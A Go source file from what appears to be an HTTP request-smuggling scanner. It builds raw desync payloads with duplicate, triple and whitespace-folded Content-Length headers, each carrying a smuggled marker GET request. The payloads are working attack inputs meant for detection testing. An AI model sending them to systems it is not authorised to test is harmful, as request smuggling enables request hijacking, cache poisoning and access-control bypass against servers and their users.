package vectors

import (
	"fmt"

	"github.com/byteoverride/desynctrace/internal/client"
)

// DoubleCLVector tests for duplicate Content-Length header disagreement.
// When two CL headers are present, some servers take the first value,
// others take the last. If frontend and backend disagree, it's a desync.
type DoubleCLVector struct{}

func NewDoubleCLVector() *DoubleCLVector {
	return &DoubleCLVector{}
}

func (v *DoubleCLVector) Name() string {
	return "Double-CL (Duplicate Content-Length Headers)"
}

func (v *DoubleCLVector) Type() VectorType {
	return DoubleCL
}

func (v *DoubleCLVector) GeneratePayloads(baseReq *client.Request) []*client.Request {
	// Standard clients deduplicate headers, so we can't test this via
	// the high-level client. Use GenerateRawPayloads instead.
	return nil
}

func (v *DoubleCLVector) GenerateRawPayloads(host, path string) []RawPayload {
	var payloads []RawPayload

	// 1. First CL is short (0), second CL is actual body length
	// If server uses first: ignores body. If server uses last: reads body.
	{
		smuggled := fmt.Sprintf("GET /desynctrace-dcl1 HTTP/1.1\r\nHost: %s\r\n\r\n", host)
		raw := fmt.Sprintf("POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Length: 0\r\n"+
			"Content-Length: %d\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n"+
			"%s", path, host, len(smuggled), smuggled)
		payloads = append(payloads, RawPayload{
			Name:        "double-cl-first-zero",
			Data:        []byte(raw),
			Description: "Double CL: first=0, second=real. Server using first ignores body; server using second reads smuggled request.",
			Technique:   "double-cl",
		})
	}

	// 2. First CL is actual length, second is 0
	{
		smuggled := fmt.Sprintf("GET /desynctrace-dcl2 HTTP/1.1\r\nHost: %s\r\n\r\n", host)
		raw := fmt.Sprintf("POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Length: %d\r\n"+
			"Content-Length: 0\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n"+
			"%s", path, host, len(smuggled), smuggled)
		payloads = append(payloads, RawPayload{
			Name:        "double-cl-second-zero",
			Data:        []byte(raw),
			Description: "Double CL: first=real, second=0. Server using second ignores body.",
			Technique:   "double-cl",
		})
	}

	// 3. Both CL present but different non-zero values
	// First CL is small (covers partial body), second covers everything
	{
		prefix := "x=1&"
		smuggled := fmt.Sprintf("GET /desynctrace-dcl3 HTTP/1.1\r\nHost: %s\r\n\r\n", host)
		fullBody := prefix + smuggled
		raw := fmt.Sprintf("POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Type: application/x-www-form-urlencoded\r\n"+
			"Content-Length: %d\r\n"+
			"Content-Length: %d\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n"+
			"%s", path, host, len(prefix), len(fullBody), fullBody)
		payloads = append(payloads, RawPayload{
			Name:        "double-cl-partial-vs-full",
			Data:        []byte(raw),
			Description: "Double CL: first covers only prefix, second covers full body including smuggled request.",
			Technique:   "double-cl",
		})
	}

	// 4. Triple Content-Length (novel edge case)
	{
		smuggled := fmt.Sprintf("GET /desynctrace-dcl4 HTTP/1.1\r\nHost: %s\r\n\r\n", host)
		raw := fmt.Sprintf("POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Length: 0\r\n"+
			"Content-Length: %d\r\n"+
			"Content-Length: 0\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n"+
			"%s", path, host, len(smuggled), smuggled)
		payloads = append(payloads, RawPayload{
			Name:        "triple-cl",
			Data:        []byte(raw),
			Description: "Triple CL: 0, real, 0. Tests which value wins in three-way conflict.",
			Technique:   "triple-cl",
		})
	}

	// 5. CL with different spacing/formatting
	{
		smuggled := fmt.Sprintf("GET /desynctrace-dcl5 HTTP/1.1\r\nHost: %s\r\n\r\n", host)
		raw := fmt.Sprintf("POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Length: 0\r\n"+
			" Content-Length: %d\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n"+
			"%s", path, host, len(smuggled), smuggled)
		payloads = append(payloads, RawPayload{
			Name:        "double-cl-folded",
			Data:        []byte(raw),
			Description: "Double CL: second prefixed with space (obs-fold). Some parsers see it as continuation of previous header.",
			Technique:   "double-cl-fold",
		})
	}

	return payloads
}

func (v *DoubleCLVector) Verify(resp *client.Response) bool {
	return resp.StatusCode >= 400
}
